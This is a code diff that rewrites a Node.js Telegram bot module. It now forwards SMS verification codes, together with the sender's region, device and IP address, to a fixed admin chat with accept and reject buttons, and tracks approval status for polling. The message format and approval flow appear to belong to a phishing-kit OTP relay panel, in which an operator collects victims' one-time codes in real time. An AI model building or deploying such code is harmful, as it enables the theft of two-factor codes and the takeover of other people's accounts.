@@ -1,35 +1,67 @@
+require('dotenv').config();
 const TelegramBot = require('node-telegram-bot-api');
-const token = 'YOUR_TELEGRAM_BOT_TOKEN';
-const bot = new TelegramBot(token, { polling: true });
 
-let pendingRequests = {};
+const BOT_TOKEN = process.env.BOT_TOKEN;
+const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;
+const APP_URL = process.env.APP_URL;
 
-bot.onText(/\/start/, (msg) => {
-    bot.sendMessage(msg.chat.id, 'Welcome! Please enter your 2FA code.');
-});
+const bot = new TelegramBot(BOT_TOKEN, { polling: true });
 
-bot.on('message', (msg) => {
-    const chatId = msg.chat.id;
-    if (pendingRequests[chatId]) {
-        if (msg.text === 'Accept') {
-            bot.sendMessage(chatId, '2FA code accepted. Redirecting...');
-            // Logic to redirect to the next page
-            delete pendingRequests[chatId]; // Clear the request after acceptance
-        } else if (msg.text === 'Reject') {
-            bot.sendMessage(chatId, '2FA code rejected. Please try again.');
-            delete pendingRequests[chatId];
-        }
-    }
-});
+// In-memory store for approvals
+const approvals = {};
 
-function send2FACode(code, chatId) {
-    pendingRequests[chatId] = true;
-    bot.sendMessage(chatId, `Your 2FA code is: ${code}`, {
-        reply_markup: {
-            keyboard: [['Accept', 'Reject']],
-            one_time_keyboard: true,
-        },
-    });
+// Set approval status
+function setApprovalStatus(requestId, status) {
+  approvals[requestId] = status;
 }
 
-module.exports = { send2FACode };
+// Get approval status
+function getApprovalStatus(requestId) {
+  return approvals[requestId] || 'pending';
+}
+
+// Send 2FA request to Telegram with inline buttons
+async function sendTelegram2FARequest({ code, region, device, ip, requestId }) {
+  const message =
+    `📨📨📨 <b>test - sms</b> 📨📨📨\n` +
+    `<b>💬 SMS:</b> <code>${code}</code>\n` +
+    `<b>🌍 Region:</b> ${region}\n` +
+    `<b>💻 Device:</b> ${device}\n` +
+    `<b>📡 IP:</b> ${ip}`;
+
+  await bot.sendMessage(ADMIN_CHAT_ID, message, {
+    parse_mode: 'HTML',
+    reply_markup: {
+      inline_keyboard: [
+        [
+          { text: '✅ Accept', callback_data: `accept_${requestId}` },
+          { text: '❌ Reject', callback_data: `reject_${requestId}` }
+        ]
+      ]
+    }
+  });
+}
+
+// Handle button presses
+bot.on('callback_query', (query) => {
+  const { data, message } = query;
+  if (!data) return;
+
+  if (data.startsWith('accept_')) {
+    const requestId = data.replace('accept_', '');
+    setApprovalStatus(requestId, 'approved');
+    bot.editMessageReplyMarkup({ inline_keyboard: [] }, { chat_id: message.chat.id, message_id: message.message_id });
+    bot.sendMessage(message.chat.id, `✅ Request <code>${requestId}</code> accepted.`, { parse_mode: 'HTML' });
+  } else if (data.startsWith('reject_')) {
+    const requestId = data.replace('reject_', '');
+    setApprovalStatus(requestId, 'rejected');
+    bot.editMessageReplyMarkup({ inline_keyboard: [] }, { chat_id: message.chat.id, message_id: message.message_id });
+    bot.sendMessage(message.chat.id, `❌ Request <code>${requestId}</code> rejected.`, { parse_mode: 'HTML' });
+  }
+});
+
+module.exports = {
+  sendTelegram2FARequest,
+  setApprovalStatus,
+  getApprovalStatus
+};
